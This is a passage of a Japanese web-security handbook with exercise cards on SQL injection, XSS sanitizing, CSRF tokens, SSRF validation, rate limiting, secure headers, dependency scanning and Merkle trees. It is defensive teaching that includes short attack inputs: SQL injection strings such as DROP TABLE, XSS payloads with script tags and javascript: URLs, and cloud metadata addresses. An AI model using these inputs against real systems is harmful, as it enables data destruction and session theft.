> - 開始地点: `code/ch23/sqli/starter/README.md`、`code/ch23/sqli/starter/demo.ts`
> - 模範解答: `code/ch23/sqli/solution/README.md`、`code/ch23/sqli/solution/demo.ts`
>
> **推定時間の内訳**: unsafeQuery と safeQuery の実装25分、擬似評価と demonstrateAttack の実装35分、攻撃入力3種の比較と記録30分
<!-- handbook:exercise:end -->

**要件**: 同じユーザー検索 API を2バージョン書く:
- **bad**: 文字列連結
- **good**: プレースホルダ

そして「攻撃クライアント」で `'OR 1=1 --` `'; DROP TABLE users; --` 等を投げて、bad の脆弱性と good の防御を確認。

模範解答: `code/ch23/sqli/`

#### 課題23.2: XSS 防御 ― エスケープとサニタイズ (★★)

**目的**: HTML エスケープ + DOM XSS の両方を体験。

<!-- handbook:exercise:start {"id":"23.2"} -->
> **演習カード 課題23.2** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.3 XSS (Cross-Site Scripting) を読み、Reflected と Stored の違いと出力文脈ごとのエスケープを説明できる
> - 23.25 CSP Trusted Types ― XSS 防御の最終形 に目を通し、サニタイズが唯一の防御層ではないことを確認する
> - ブラウザのDevToolsで Elements パネルを開き、innerHTML 代入後のDOMノードを確認できる
> - 正規表現の置換で貪欲・非貪欲の違いを扱える
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] escapeHtml() が & < > " ' の5文字を &amp; &lt; &gt; &quot; &#39; に置換する
> - [ ] sanitize('<p onclick="x">Hi<script>x</script><b>ok</b></p>', {allowedTags:['p','b']}) が <p>Hi<b>ok</b></p> を返す
> - [ ] script 要素は開始タグから終了タグまで中身ごと削除され、許可外の一般タグはタグだけ削除して内側のテキストは残る
> - [ ] on で始まるイベントハンドラ属性と javascript: スキームが出力文字列に1つも残らない
> - [ ] HTMLコメント <!-- --> が出力から除去される
>
> **期待出力**
>
> - escapeHtml('<x>') が &lt;x&gt; という7文字の文字列を返す
> - sanitize() は属性を持たない許可タグだけの文字列を返し、br や hr や img などのvoid要素は <br /> の形で出力される
> - 同じ入力を textContent へ代入した場合はタグが文字として表示され、DOMノードは増えない
>
> **観察項目**
>
> - 同じ攻撃文字列を innerHTML と textContent に代入し、DevTools の Elements パネルで script 要素ノードが生成されるかどうかの差を確認する
> - sanitize() の置換段 (コメント除去、script除去、タグ絞り込み、on属性除去) を1段ずつ外し、どの入力が通過するようになるかを記録する
> - <scr<script>ipt> のような入れ子入力を与え、1回だけの置換で穴が残るかどうかを出力文字列で確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="XSS sanitizer" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作 sanitize に <a href="javascript:alert(1)">x</a> を渡し、出力に javascript: が含まれなければ合格とする
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: エスケープとサニタイズを別関数に分ける。エスケープは「HTMLを一切許さない」場合、サニタイズは「一部タグだけ許す」場合という用途の違いから設計を始める
> 2. **構造**: sanitize は許可タグの Set を作り、置換を段階に分ける。コメント除去、script要素の中身ごと除去、タグ名の正規表現置換で許可外を落とす、最後に on属性と javascript: を除去、という順序にする
> 3. **実装の要点**: タグ置換のコールバックでは tag.toLowerCase() で比較し、full.startsWith('</') で終了タグを判別して属性を丸ごと捨てる。属性を残さない設計にすると on属性の取りこぼしを構造的に防げる
>
> **本番利用時の警告**
>
> - XSSペイロードは自分のlocalhostで開いたページだけで実行する。第三者のサイトやSaaSの入力欄へ投入すると攻撃行為になり、社内環境でも事前許可なしに行ってはならない
> - この自作サニタイザは正規表現ベースで、HTMLパーサの状態機械を再現していない。mXSS (パース時の再解釈)、SVG や MathML の名前空間、属性値内のエンコード、data: URI は防げず、本番では DOMPurify のような実装済みライブラリを使う
> - サニタイズは単独の防御層にならない。CSP の script-src と nonce、および Trusted Types による sink 制限を併用しないと、1つの取りこぼしがそのままセッション奪取につながる
>
> **導線**
>
> - 開始地点: `code/ch23/xss/starter/main.ts`
> - 模範解答: `code/ch23/xss/solution/main.ts`
>
> **推定時間の内訳**: escapeHtml の実装15分、sanitize の段階的置換の実装40分、innerHTML と textContent の比較観察と迂回入力の試行35分
<!-- handbook:exercise:end -->

**要件**:
- 危険な実装: `innerHTML = userInput`(脆弱)
- 安全な実装: `textContent = userInput` または DOMPurify 風サニタイザ
- 自作 HTML サニタイザ (許可タグのみ通す)

```typescript
const html = '<p>Hello <script>alert("XSS")</script> world</p>';
const clean = sanitize(html, { allowedTags: ['p', 'b', 'i'] });
// → '<p>Hello  world</p>'
```

模範解答: `code/ch23/xss/`

#### 課題23.3: CSRF 防御 ― トークン + SameSite (★★)

**目的**: CSRF 攻撃の仕組みと、トークン方式 + SameSite Cookie の併用。

<!-- handbook:exercise:start {"id":"23.3"} -->
> **演習カード 課題23.3** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.4 CSRF (再掲) を読み、ブラウザが自動でCookieを付ける条件を説明できる
> - Cookie属性 SameSite と Secure と Path の意味を区別できる
> - node:crypto の createHmac と timingSafeEqual を使える
> - code/ch23 で `pnpm --filter @handbook/ch23 run test` が実行できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] createCsrfToken(secret, sessionId) が nonce とHMACをドットで連結した2要素の文字列を返す
> - [ ] verifyCsrfToken() が cookieToken と formToken が一致し、かつ sessionId が発行時と同じ場合にのみ true を返す
> - [ ] sessionId を別の値に変えると同じトークンでも false になる
> - [ ] cookieToken か formToken のどちらかが欠けた場合に false を返す
> - [ ] csrfCookie() が Path=/ と Secure と SameSite=Strict の3属性を含む Set-Cookie 値を返す
>
> **期待出力**
>
> - createCsrfToken() の戻り値が base64url の nonce とHMACをドットでつないだ1行の文字列になる
> - 同じ secret と sessionId と nonce を与えると毎回同一のトークンが再現され、nonce を省くと呼び出しごとに異なる値になる
> - verifyCsrfToken() は true か false の真偽値のみを返し、不一致の理由は返さない
>
> **観察項目**
>
> - sessionId だけを変えて検証したときに false になることを確認し、トークンがセッションに束縛されている (別セッションへ使い回せない) ことを読み取る
> - MAC の比較を === に変えても機能テストは通ることを確認し、timingSafeEqual が守っているのは機能ではなくタイミング差であることを区別する
> - csrfCookie() の SameSite=Strict を Lax や None に変えたときに、どのリクエスト (トップレベル遷移、フォームPOST、サブリソース) でCookieが送られるかを整理する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="CSRF double-submit" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作実装でトークンの末尾1文字を書き換えて verifyCsrfToken に渡し、false が返れば改ざん検知が働いていると判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: トークンは「推測不能な乱数」と「サーバだけが作れる署名」の2つの性質が要る。まず乱数だけの版を作り、次にセッションへ束縛する署名を足すという順に組む
> 2. **構造**: randomBytes で nonce を作り、createHmac('sha256', secret) に sessionId と nonce を連結して更新し、nonce と MAC を結合した文字列を返す。検証側は受け取った nonce で同じ手順を再計算して比較する
> 3. **実装の要点**: MAC の比較は timingSafeEqual を使うが、長さが異なると例外になるため a.length === b.length を先に確認してから呼ぶ。Cookie とフォームの一致 (double submit) だけでは不十分で、署名検証と組み合わせて初めてサブドメインからのCookie注入に耐える
>
> **本番利用時の警告**
>
> - 別オリジンから自動送信されるフォームを実際に作って試す場合は、送信先を自分のlocalhostに限定する。他人が運用するサイトへ向けたCSRF検証用フォームを設置・公開すると攻撃の実行にあたる
> - この実装は署名の検証だけで、トークンの有効期限・ワンタイム化・ログアウト時の失効・Origin と Referer ヘッダの照合を持たない。漏れたトークンは secret を変えるまで無期限に有効なままになる
> - SameSite=Strict はブラウザ側の防御であり、古いクライアントや非ブラウザのHTTPクライアントには効かない。本番ではトークン検証を必須とし、SameSite は多層防御の1枚として扱う
>
> **導線**
>
> - 開始地点: `code/ch23/csrf.ts`
> - 模範解答: `code/ch23/csrf.solution.ts`
>
> **推定時間の内訳**: トークン生成の実装20分、検証関数と失敗系の実装30分、SameSite属性の挙動整理と別オリジン送信の観察40分
<!-- handbook:exercise:end -->

**要件**:
- 脆弱な POST フォーム (別オリジンから送信可能)
- CSRF トークンを HTML に埋め込み + Cookie でも保持 (Double-Submit)
- 検証: トークンが両方で一致

模範解答: `code/ch23/csrf.solution.ts`

#### 課題23.4: SSRF 防御 ― URL バリデータ (★★)

**目的**: ユーザー指定 URL を fetch する機能 (画像プレビュー、Webhook 等) で内部リソースを叩かれないようにする。

<!-- handbook:exercise:start {"id":"23.4"} -->
> **演習カード 課題23.4** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: localhost
>
> **前提**
>
> - 23.5 SSRF (Server-Side Request Forgery) を読み、クラウドのメタデータエンドポイントが狙われる理由を説明できる
> - IPv4のCIDR表記とビットマスクによる所属判定を計算できる
> - node:dns/promises の lookup と node:net の isIP を使える
> - code/ch23 で `pnpm --filter @handbook/ch23 run test` が実行できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] isBlockedAddress('169.254.169.254') と isBlockedAddress('127.0.0.1') と isBlockedAddress('192.168.0.1') がすべて true を返す
> - [ ] isBlockedAddress('93.184.216.34') が false を返し、公開アドレスを誤って弾かない
> - [ ] SSRFGuard.validate() が http と https 以外のスキームで例外を投げる
> - [ ] hostname が localhost の場合と、URLに username か password が含まれる場合に例外を投げる
> - [ ] resolve 済みのIPが1つでもブロック対象なら例外を投げ、通過時は url と addresses を持つオブジェクトを返す
> - [ ] allowedPorts を指定した場合、リストにないポートで例外を投げる
>
> **期待出力**
>
> - validate('https://example.com') が addresses に解決済みIPの配列、url に URL オブジェクトを持つ結果を返す
> - 拒否ケースは戻り値ではなく reject となり、unsupported protocol / localhost is blocked / private or special address is blocked / port is not allowed のいずれかのメッセージになる
> - IPv6は :: と ::1 と fc/fd 始まり (ULA) と fe80 系 (link-local) と ::ffff:127. 始まり (IPv4射影) が拒否される
>
> **観察項目**
>
> - resolve をテスト用の関数に差し替え、ホスト名は公開ドメインのままIPだけ 127.0.0.1 を返す構成にして、DNS rebinding が名前だけの検査を素通りすることを確認する
> - 0.0.0.0 と 10.0.0.0/8 と 100.64.0.0/10 (CGNAT) と 224.0.0.0/4 (マルチキャスト) が拒否リストに入っている理由を、それぞれ何に到達しうるかで整理する
> - 検査に通ったあと実際にfetchするまでの間に再解決が起こりうる点を確認し、検査済みIPへ直接接続する必要性を読み取る
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="SSRF guard" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作実装で resolve を async () => ['127.0.0.1'] に差し替えて validate('http://example.test') を呼び、rejectされれば解決後IP検査が効いていると判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 「ホスト名を見て弾く」では足りない。名前とIPは別物なので、スキーム、認証情報、ポート、ホスト名、解決後IP という順に段階を分けた検査パイプラインとして設計する
> 2. **構造**: IPv4は 4オクテットを32bit整数へ畳み、prefix長からマスクを作って base と一致するかで判定する。IPv6は正規化して小文字にし、::1 と fc/fd と fe80 系のプレフィックスで判定する。DNS解決は差し替え可能な resolve オプションとして注入できるようにする
> 3. **実装の要点**: ビットシフトは符号付きになるため (0xffffffff << (32 - bits)) >>> 0 のように符号なしへ戻す。prefix長0のときシフト量32はシフトなしと同義になるので、bits === 0 を分岐で先に処理する
>
> **本番利用時の警告**
>
> - 自作バリデータの穴を探す実験は、自分のマシンのlocalhostと自分が所有するテストドメインだけで行う。169.254.169.254 などクラウドのメタデータエンドポイントを他人のアカウントや職場の環境で叩くと権限昇格の試行とみなされる
> - この SSRFGuard は検査時点のIPしか見ないため、検査と実際の接続の間にDNSが差し替わる TOCTOU 型の rebinding は防げない。本番では解決済みIPを固定して接続するか、egress proxy と VPC のネットワークポリシーで出口自体を制限する
> - リダイレクト追跡は実装されていない。fetch のデフォルトは 3xx を自動追従するため、検査を通った公開URLから内部アドレスへ飛ばされる。本番では redirect を manual にし、各ホップで同じ検査をやり直す必要がある
>
> **導線**
>
> - 開始地点: `code/ch23/ssrf-guard.ts`
> - 模範解答: `code/ch23/ssrf-guard.solution.ts`
>
> **推定時間の内訳**: CIDR判定関数の実装30分、URL検査パイプラインとDNS解決の注入35分、rebinding とリダイレクトの迂回実験25分
<!-- handbook:exercise:end -->

**要件**: 以下を拒否する URL バリデータ:
- private IP (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8)
- link-local (169.254.0.0/16, fe80::/10) ← AWS metadata endpoint 攻撃
- localhost, 0.0.0.0
- 別ポート (80/443以外) はオプションで拒否
- DNS rebinding 対策: URL の host を resolve した IP も検証

```typescript
const validator = new SSRFGuard();
await validator.validate('https://example.com');         // OK
await validator.validate('http://169.254.169.254/');     // ✗ AWS metadata
await validator.validate('http://192.168.0.1/admin');    // ✗ private
await validator.validate('http://localhost:5432');       // ✗ localhost
```

模範解答: `code/ch23/ssrf-guard.solution.ts`

#### 課題23.5: レート制限 (★★★)

**目的**: ブルートフォース攻撃 / DDoS 防御の基本。Token Bucket と Sliding Window 両方を実装。

<!-- handbook:exercise:start {"id":"23.5"} -->
> **演習カード 課題23.5** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.6 認証関連の脆弱性 を読み、ブルートフォースに対するレート制限の位置づけを説明できる
> - 23.12 ログとモニタリング を読み、拒否イベントを記録する意味を確認する
> - 時刻を関数として注入し、テストで仮想時間を進める書き方ができる
> - Map を使ったキー別の状態管理を TypeScript で書ける
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] TokenBucket({capacity:2, refillPerSec:1}) が連続2回の tryConsume() で true、3回目で false を返す
> - [ ] 仮想時刻を1000ms進めると TokenBucket が再び true を返し、トークンが capacity を超えて溜まらない
> - [ ] tryConsume(n) が n トークンをまとめて消費でき、残量不足なら消費せずに false を返す
> - [ ] SlidingWindowLimiter({windowMs:1000, max:2}) が同一キーで2回まで allowed:true、3回目に allowed:false を返す
> - [ ] check() の戻り値が allowed と remaining と retryAfterMs の3キーを持ち、拒否時の retryAfterMs が正の値になる
> - [ ] キーが異なる場合はカウンタが独立し、別ユーザーの消費が影響しない
>
> **期待出力**
>
> - TokenBucket.remaining() が経過時間に比例して増え、capacity で頭打ちになる小数値を返す
> - SlidingWindowLimiter.check() が {allowed:true, remaining:1, retryAfterMs:0} のような形のオブジェクトを返し、拒否時は remaining:0 になる
> - 拒否時の retryAfterMs が「最古のログ時刻 + windowMs - 現在時刻」に一致する
>
> **観察項目**
>
> - TokenBucket は burst を許して平均を絞り、SlidingWindow は窓内の総数を厳密に絞るという性質差を、20回連続呼び出しの許可パターンを並べて確認する
> - SlidingWindowLimiter のログ配列がキーごとに増え続けるかどうかを確認し、窓外の要素をいつ捨てているかをコード上で特定する
> - 固定窓 (fixed window) で実装した場合に窓の境界をまたいで max の2倍が通ってしまう現象を、境界時刻をまたぐ呼び出しで再現する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="rate limiters" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作実装で now を関数注入し、時刻を進めない状態で capacity+1 回呼んで最後だけ false になれば境界条件が正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 実時間に依存させるとテストが不安定になる。最初から now を差し替え可能なオプションとして受け取り、Date.now をデフォルトにする設計から始める
> 2. **構造**: TokenBucket は「最後に補充した時刻」と「現在のトークン数」の2状態だけを持ち、呼び出しのたびに経過秒数 × refillPerSec を加算して capacity で clamp する。SlidingWindow はキーごとに許可時刻の配列を持ち、窓外を filter で捨ててから長さを max と比較する
> 3. **実装の要点**: TokenBucket は補充を setInterval ではなく呼び出し時の遅延計算で行うのが要点で、これによりアイドル時にタイマーが走らない。SlidingWindow は拒否したときも filter 後の配列を保存し直さないと、古い要素が残って retryAfterMs がずれる
>
> **本番利用時の警告**
>
> - このレート制限はプロセス内の Map に状態を持つため、複数インスタンスへスケールアウトすると実効上限がインスタンス数倍になる。本番では Redis などの共有ストアか、ロードバランサ層の制限機能を使う
> - SlidingWindowLimiter はキーごとに許可時刻をすべて配列で保持し、キーの上限も TTL も持たない。攻撃者が毎回異なるキー (IPやユーザーID) を送ると Map が際限なく膨らみメモリ枯渇を起こすため、本番ではLRU退避か有効期限付きストアが必須になる
> - レート制限をIPアドレス単位だけで行うと、NAT配下の正規利用者をまとめて遮断する一方、分散した攻撃元には効かない。認証情報やアカウント単位の制限と組み合わせ、拒否イベントを監視へ送る前提で設計する
>
> **導線**
>
> - 開始地点: `code/ch23/rate-limit.ts`
> - 模範解答: `code/ch23/rate-limit.solution.ts`
>
> **推定時間の内訳**: TokenBucket の遅延補充実装35分、SlidingWindow のログ管理と retryAfterMs 実装40分、仮想時刻テストの作成40分、両方式の許可パターン比較と記録35分
<!-- handbook:exercise:end -->

**Token Bucket**:
```typescript
const bucket = new TokenBucket({ capacity: 10, refillPerSec: 5 });
for (let i = 0; i < 20; i++) {
  if (bucket.tryConsume(1)) console.log('OK');
  else console.log('429 Too Many Requests');
}
```

**Sliding Window** (ログベース、より厳密):
```typescript
const limiter = new SlidingWindowLimiter({ windowMs: 60_000, max: 100 });
limiter.check('user-123'); // OK/拒否
```

模範解答: `code/ch23/rate-limit.solution.ts`

#### 課題23.6: セキュアヘッダ middleware (★★)

**目的**: CSP、HSTS、X-Frame-Options 等を一括設定する Express 風ミドルウェア。

<!-- handbook:exercise:start {"id":"23.6"} -->
> **演習カード 課題23.6** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.11 セキュアヘッダ を読み、各ヘッダが防ぐ攻撃を対応付けられる
> - 23.17 HSTS の詳細 ― HTTPS 強制の正しい使い方 を読み、preload の不可逆性を確認する
> - Express 風の (req, res, next) ミドルウェアの呼び出し規約を知っている
> - ブラウザのDevToolsの Network タブでレスポンスヘッダを確認できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] buildSecurityHeaders() の戻り値が Content-Security-Policy と Strict-Transport-Security と X-Frame-Options と X-Content-Type-Options と Referrer-Policy と Permissions-Policy の6キーをすべて含む
> - [ ] csp の defaultSrc と scriptSrc というキャメルケースのキーが default-src と script-src へ変換され、値がスペース区切り、ディレクティブ間がセミコロン区切りで連結される
> - [ ] hsts の includeSubDomains と preload が false のときは対応するトークンが出力に含まれない
> - [ ] contentTypeOptions が true のとき X-Content-Type-Options: nosniff が付く
> - [ ] securityHeaders() が返す関数が res.setHeader を各ヘッダ分だけ呼び、最後に next() を1回呼ぶ
> - [ ] オプションで指定しなかったヘッダは戻り値のキーに現れない
>
> **期待出力**
>
> - Content-Security-Policy の値が default-src 'self'; script-src 'self' https://cdn.example.com のような1行の文字列になる
> - Strict-Transport-Security の値が max-age=31536000; includeSubDomains; preload のようにセミコロン区切りで組まれる
> - Permissions-Policy が camera=(), microphone=() のようにカンマ区切りで、空配列は空の括弧になる
>
> **観察項目**
>
> - 生成した CSP を実際のページに適用し、DevTools の Console に出る Refused to load / Refused to execute の違反メッセージで、どのディレクティブがどのリソースを止めたかを対応付ける
> - X-Frame-Options: DENY と CSP の frame-ancestors 'none' を並べ、どちらが新しく、どちらが古いブラウザ向けの冗長化かを確認する
> - Referrer-Policy を no-referrer と strict-origin-when-cross-origin で切り替え、Network タブの Referer ヘッダの中身がどこまで残るかを比較する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="security middleware" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作ミドルウェアを組み込んだサーバに `curl -sI http://localhost:3000/` を実行し、6ヘッダすべてが出力に現れれば合格とする
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: ヘッダ文字列の組み立てと、res へ書き込むミドルウェアを別関数に分ける。前者は純関数なのでテストが容易になり、後者は薄いラッパで済む
> 2. **構造**: buildSecurityHeaders(options) が Record<string, string> を返し、securityHeaders(options) がそれを閉じ込めた (req, res, next) を返す構成にする。CSP は Object.entries でディレクティブ名を変換しつつ join('; ') する
> 3. **実装の要点**: キャメルケースからケバブケースへの変換は value.replace(/[A-Z]/g, m => `-${m.toLowerCase()}`) の1行で書ける。HSTS の includeSubDomains は仕様上この大文字小文字混在の綴りで、ケバブケース変換の対象にしてはいけない
>
> **本番利用時の警告**
>
> - HSTS の preload はブラウザに組み込まれたリストへ載るため、いったん配信すると取り消しに数か月かかる。max-age を短くして検証してから preload を付ける手順を踏まないと、証明書の失効やサブドメインのHTTP運用でサイト全体が到達不能になる
> - このミドルウェアは静的な文字列を組み立てるだけで、リクエストごとの nonce 生成もハッシュ計算も行わない。script-src に 'self' しか書かない状態でインラインスクリプトを使うページに適用すると、CSPが機能を壊すか、'unsafe-inline' を足して防御が無効化されるかのどちらかになる
> - ヘッダは多層防御の最外層でしかない。CSP が付いていても、サーバ側のエスケープ・認可・入力検証を省略してよい理由にはならず、レポート専用モード (Content-Security-Policy-Report-Only) での事前計測を経ずに本番へ入れると正規機能を遮断する
>
> **導線**
>
> - 開始地点: `code/ch23/secure-headers.ts`
> - 模範解答: `code/ch23/secure-headers.solution.ts`
>
> **推定時間の内訳**: ヘッダ組み立て関数の実装30分、ミドルウェア化と curl での確認25分、CSP違反をブラウザで発生させて観察35分
<!-- handbook:exercise:end -->

**要件**:

```typescript
app.use(securityHeaders({
  csp: { defaultSrc: ["'self'"], scriptSrc: ["'self'", "https://cdn.example.com"] },
  hsts: { maxAge: 31536000, includeSubDomains: true, preload: true },
  frameOptions: 'DENY',
  contentTypeOptions: true,
  referrerPolicy: 'strict-origin-when-cross-origin',
  permissionsPolicy: { camera: [], microphone: [] },
}));
```

すべてのレスポンスに以下が付くか確認:
- `Content-Security-Policy`
- `Strict-Transport-Security`
- `X-Frame-Options`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

模範解答: `code/ch23/secure-headers.solution.ts`

#### 課題23.7: 依存パッケージ脆弱性スキャナ (★★)

**目的**: `npm audit` 風のツールを自作。package.json と package-lock.json を読んで、脆弱性 DB (簡易版) と照合。

<!-- handbook:exercise:start {"id":"23.7"} -->
> **演習カード 課題23.7** ― 難易度 ★★ ／ 推定時間 90分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.10 依存パッケージの脆弱性 を読み、直接依存と推移的依存の違いを説明できる
> - package-lock.json の packages キーと dependencies キーの2形式の違いを把握している
> - semver の キャレット と チルダ と比較演算子レンジの意味を説明できる
> - code/ch23 で `pnpm --filter @handbook/ch23 run test` が実行できる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] extractLockedVersions() が lock の packages 配下の node_modules/ プレフィックスを除いたパッケージ名とバージョンの対応表を返す
> - [ ] 旧形式の dependencies ツリーを再帰的にたどり、ネストした推移的依存もバージョン表に含める
> - [ ] satisfies('1.2.3', '>=1.0.0 <2.0.0') が true、satisfies('2.0.0', '>=1.0.0 <2.0.0') が false を返す
> - [ ] キャレットとチルダのレンジがメジャー固定・マイナー固定として正しく判定される
> - [ ] scan() が該当する脆弱性ごとに name と version と severity と id と title を持つ Finding を返す
> - [ ] 結果が CRITICAL, HIGH, MEDIUM, LOW の順に並ぶ
>
> **期待出力**
>
> - scan() が Finding の配列を返し、該当0件のときは空配列になる
> - 1件ヒットしたときの要素が {name, range, severity:'HIGH', id, title, version:'1.2.3'} のように advisory の全項目に実バージョンを足した形になる
> - 重大度の異なる複数件を渡すと、CRITICAL が先頭、LOW が末尾に並んだ配列になる
>
> **観察項目**
>
> - スペース区切りのレンジがAND、二重パイプ区切りがORとして扱われることを、両方を含むレンジ文字列で確認する
> - prerelease 付きバージョン (1.2.3-beta.1 など) を渡し、数値化の際に beta 部分がどう扱われるかを確認して semver 仕様との差を記録する
> - 同じパッケージが異なるバージョンで複数階層に入っている lock を与え、バージョン表が後勝ちで1つに潰れることによる検出漏れを確認する
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="dependency scanner" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作 scan に空の advisory 配列を渡して空配列が返り、該当する1件だけを渡して長さ1の配列が返れば分類ロジックが正しいと判定する
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: ロックファイルの読み取り、レンジ判定、突き合わせ、重大度による並べ替えという4つの独立した関数に分け、それぞれ単体でテストできる形にする
> 2. **構造**: バージョン比較はメジャー・マイナー・パッチの3要素を数値配列にして辞書順で比較する。レンジは二重パイプで OR に分割し、各項をスペースで AND に分割し、先頭の演算子を正規表現で切り出して分岐する
> 3. **実装の要点**: キャレットとチルダは「下限以上」かつ「上位桁が一致」の2条件の合成として書くと短くなる。数値化のとき Number('') が NaN になる点と、v プレフィックスの除去を忘れると全比較が壊れる点に注意する
>
> **本番利用時の警告**
>
> - この簡易 semver 実装は prerelease タグとビルドメタデータを切り捨てるため、`1.2.3-beta` と `1.2.3` を同一視する。本物の npm audit と結果が食い違うので、実プロジェクトの可否判断には使わず、公式のアドバイザリDBと npm audit を使う
> - スキャナは脆弱性の存在しか見ず、その関数が実際に呼ばれているか (到達可能性) や実行時の入力条件を評価しない。結果をそのままCIの失敗条件にすると、影響のない検出でビルドが止まり、無効化の運用に流れて本当に危険な検出まで無視されるようになる
> - バージョン表がパッケージ名で一意になる設計のため、同名パッケージが複数バージョン同居する実際の node_modules では脆弱なほうを見落とす。本番のスキャナはパス単位でツリーを保持する
>
> **導線**
>
> - 開始地点: `code/ch23/dep-scanner.ts`
> - 模範解答: `code/ch23/dep-scanner.solution.ts`
>
> **推定時間の内訳**: ロックファイル2形式のパース実装25分、semver レンジ判定の実装35分、突き合わせと重大度ソート15分、prerelease や重複バージョンでの検出漏れ確認15分
<!-- handbook:exercise:end -->

**要件**:
- package-lock.json から依存ツリーを抽出
- 既知脆弱性 DB(本実装では簡易JSON) と照合
- semver マッチング
- 結果を CRITICAL / HIGH / MEDIUM / LOW で分類

模範解答: `code/ch23/dep-scanner.solution.ts`

#### 課題23.8: Merkle Tree(23.14 の応用) (★★★)

**目的**: 監査ログの改ざん検知に使う Merkle Tree を実装。

<!-- handbook:exercise:start {"id":"23.8"} -->
> **演習カード 課題23.8** ― 難易度 ★★★ ／ 推定時間 150分 ／ 必要サービス: なし
>
> **前提**
>
> - 23.14 Merkle Tree ― 大量データの完全性証明 を読み、inclusion proof の検証手順を図で追える
> - 23.20 Certificate Transparency (CT) を読み、Merkle Tree が実運用で何を保証しているかを確認する
> - node:crypto の createHash で SHA-256 のダイジェストを計算できる
> - ビット演算とインデックス計算で兄弟ノードを求められる
>
> **完成条件 (自己採点用チェックリスト)**
>
> - [ ] append() で追加した各エントリが葉ハッシュへ変換され、root() が固定長のhex文字列を返す
> - [ ] 葉とノードで異なるプレフィックス (leaf: と node:) を付けてハッシュしている
> - [ ] エントリ数が奇数の階層で最後のノードを複製して繰り上げ、根が1つに収束する
> - [ ] proof(index) が position (left か right) と hash を持つ要素の配列を返す
> - [ ] MerkleTree.verify(値, proof, root) が正しい値で true、1文字でも異なる値で false を返す
> - [ ] 範囲外のインデックスを proof() に渡すと index out of range で例外になる
>
> **期待出力**
>
> - 3件を追加したツリーの root() が64文字のhex文字列になる
> - proof(1) の長さが log2(葉数) の切り上げ (3葉なら2要素) になり、各要素が position と hash の2キーを持つ
> - 改ざんした値で verify するとハッシュの再計算結果が root と一致せず false になる
>
> **観察項目**
>
> - 葉に leaf: プレフィックスを付けない実装に変え、内部ノードのハッシュを葉として提出できてしまう second preimage 攻撃が成立することを確認する
> - 葉を1件追加したときに root が全面的に変わり、proof の長さが階層の増減に応じて変わる様子を記録する
> - proof の position を left と right で入れ替えると検証が false になることを確認し、結合順序が証明の一部であることを読み取る
>
> **テスト方法 (自己採点手順)**
>
> 1. `pnpm --filter @handbook/ch23 exec tsx --test --test-name-pattern="Merkle proof" solutions.test.ts` を実行し、passすれば合格
> 2. `pnpm --filter @handbook/ch23 run test` で章の8件がすべてpassすることを確認する
> 3. 自作実装で葉を1件から8件まで増やしながら全インデックスの proof を verify し、すべて true になり、かつ他の葉の値では false になれば合格とする
>
> **段階的ヒント** (模範解答を開く前に、1から順に必要な分だけ読む)
>
> 1. **方針**: 先に root() だけを作り、階層を1段ずつ畳む while ループを完成させる。proof はその畳み込みと同じループの中で兄弟を記録するだけ、と気づくと実装が半分になる
> 2. **構造**: 葉配列を保持し、level を while (level.length > 1) で畳む。proof では現在位置 i の兄弟を i ^ 1 で求め、i が偶数なら兄弟は右、奇数なら左として position を記録し、各段の最後に i = Math.floor(i / 2) で親へ移動する
> 3. **実装の要点**: 奇数個の階層では level[i + 1] が undefined になるので自分自身を複製して埋める。verify 側は position に従って結合順を入れ替える必要があり、left なら proof のハッシュを前、right なら後ろに置く
>
> **本番利用時の警告**
>
